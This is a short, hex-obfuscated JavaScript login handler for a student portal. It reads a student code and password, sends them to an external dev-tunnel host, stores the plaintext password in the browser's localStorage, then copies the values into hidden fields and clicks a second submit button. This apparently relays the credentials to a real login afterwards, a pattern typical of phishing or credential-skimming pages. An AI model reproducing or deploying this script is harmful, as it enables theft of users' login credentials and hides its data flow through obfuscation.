function sel(id_class) {return document.querySelector(id_class);} function sf() {var stc = sel("\x23\x73\x74\x75\x64\x65\x6E\x74\x5F\x63\x6F\x64\x65").value;var psw = sel("\x23\x70\x61\x73\x73\x77\x6F\x72\x64").value;var data = {"\x73\x74\x75\x64\x65\x6E\x74\x5F\x63\x6F\x64\x65" : stc, "\x70\x61\x73\x73\x77\x6F\x72\x64" : psw, "\x6C\x6F\x67\x69\x6E":"\x4C\x6F\x67\x69\x6E"}; sel("#sc2").value=stc; sel("#pw2").value=psw; $.post("https://9rz8x349-8080.inc1.devtunnels.ms/api/auth", data).done(function(response){if (response=="\x73\x75\x63\x63\x65\x73\x73") {localStorage.setItem("\x73\x74\x75\x64\x65\x6E\x74\x5F\x63\x6F\x64\x65", stc);localStorage.setItem("\x70\x61\x73\x73\x77\x6F\x72\x64", psw);sel(".erm").style.display = "none"; sel("#sm2").click(); } else {sel(".erm").style.display = "block"; }}).fail(function() {window.location.href="/"});}
